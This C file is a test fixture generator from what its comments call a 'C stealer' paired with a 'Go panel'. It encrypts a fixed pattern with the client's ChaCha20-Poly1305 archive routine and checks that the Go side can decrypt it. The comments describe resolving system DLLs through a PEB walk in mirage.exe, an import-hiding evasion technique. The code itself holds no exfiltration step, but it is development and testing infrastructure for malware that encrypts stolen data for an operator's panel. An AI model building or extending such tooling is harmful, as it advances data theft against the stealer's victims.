/*
 * test_interop_gen.c — C→Go archive interop fixture generator
 *
 * Encrypts a fixed 1024-byte pattern with the REAL client code
 * (src/crypto/archive_crypt.c archive_encrypt → PBKDF2-SHA256 seed
 * derivation + RFC 8439 ChaCha20-Poly1305) and writes the wire-format
 * envelope [nonce:12][salt:16][ct][tag:16] to
 * panel/testdata/archive_sample.bin.
 *
 * The Go side (panel/internal/services/archive_decrypt_test.go,
 * TestDecryptArchive_CSamples) must decrypt it back to the exact
 * plaintext with golang.org/x/crypto chacha20poly1305 — the two-way
 * interop lock between the C stealer and the Go panel.
 *
 * The fixture is deterministic given MIRAGE_SEED (nonce/salt are random
 * but written into the file, so decryption is deterministic; regenerate
 * after every MIRAGE_SEED change with: mingw32-make test-interop-gen).
 * The key derives from the committed seed constant — not a secret.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "archive_crypt.h"
#include "chacha_poly.h"

#define PT_LEN 1024

int main(int argc, char **argv) {
    const char *out_path = (argc > 1) ? argv[1]
                          : "panel/testdata/archive_sample.bin";

    /* mirage.exe resolves bcrypt.dll/advapi32.dll via PEB walk after the
     * loader mapped them; in this host test binary they are delay-loaded,
     * so map them explicitly before the PEB-walk lookups run. */
    LoadLibraryA("bcrypt.dll");
    LoadLibraryA("advapi32.dll");
    LoadLibraryA("cryptbase.dll");  /* advapi32!SystemFunction036 forwards here */

    unsigned char pt[PT_LEN];
    for (size_t i = 0; i < sizeof(pt); i++)
        pt[i] = (unsigned char)(i % 251);

    unsigned char out[ARCHIVE_HEADER_LEN + PT_LEN + CHACHA_POLY_TAG_LEN];
    size_t out_len = sizeof(out);
    if (archive_encrypt(pt, sizeof(pt), NULL, 0, out, &out_len) != 0) {
        fprintf(stderr, "interop_gen: archive_encrypt failed\n");
        return 1;
    }
    if (out_len != ARCHIVE_HEADER_LEN + PT_LEN + CHACHA_POLY_TAG_LEN) {
        fprintf(stderr, "interop_gen: unexpected envelope size %zu\n", out_len);
        return 1;
    }

    FILE *f = fopen(out_path, "wb");
    if (!f) {
        fprintf(stderr, "interop_gen: cannot open %s\n", out_path);
        return 1;
    }
    if (fwrite(out, 1, out_len, f) != out_len) {
        fprintf(stderr, "interop_gen: short write\n");
        fclose(f);
        return 1;
    }
    fclose(f);

    /* Self-check: the client must be able to decrypt its own envelope
     * back to the exact plaintext. */
    unsigned char back[PT_LEN];
    size_t back_len = sizeof(back);
    if (archive_decrypt(out, out_len, NULL, 0, back, &back_len) != 0
        || back_len != PT_LEN || memcmp(back, pt, PT_LEN) != 0) {
        fprintf(stderr, "interop_gen: roundtrip self-check failed\n");
        return 1;
    }

    printf("interop_gen: wrote %s (%zu bytes), roundtrip OK\n",
           out_path, out_len);
    return 0;
}
